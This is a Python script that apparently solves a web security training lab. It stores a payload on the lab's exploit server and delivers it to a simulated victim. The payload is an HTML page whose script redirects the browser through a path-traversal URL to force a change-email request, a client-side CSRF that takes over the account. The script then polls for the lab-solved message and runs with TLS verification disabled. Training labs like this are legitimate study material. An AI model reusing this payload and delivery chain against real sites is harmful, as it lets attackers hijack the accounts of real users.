import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def submit_exploit_server(session, url, response_file, response_head, response_body, form_action):
    params = {
        "urlIsHttps": "on",
        "responseFile": response_file,
        "responseHead": response_head,
        "responseBody": response_body,
        "formAction": form_action
    }
    resp = session.post(url, data=params, verify=False, allow_redirects=True)
    if resp.status_code not in (200, 302):
        raise ValueError(f"Exploit server request failed with status code {resp.status_code}")
    return True


def is_lab_solved(session, host):
    resp = session.get(host, verify=False)
    return "Congratulations, you solved the lab!" in resp.text


def main():
    host = "https://0a2f003f04875b32804a30bb0019003e.web-security-academy.net"
    exploit_host = "https://exploit-0ab100d404265bf5804f2f4001de0028.exploit-server.net"

    payload = f'''<html>
	<body>
                <script>
    document.location = "{host}/post/comment/confirmation?postId=7/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
                 </script>
	</body>
<html>
'''

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

    session = requests.Session()
    submit_exploit_server(session, f"{exploit_host}/", "/exploit", response_head, payload, "STORE")
    print("Exploit stored.")

    submit_exploit_server(session, f"{exploit_host}/", "/exploit", response_head, payload, "DELIVER_TO_VICTIM")
    print("Exploit delivered to victim.")

    time.sleep(10)
    if is_lab_solved(session, f"{host}/"):
        print("Koated !!!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()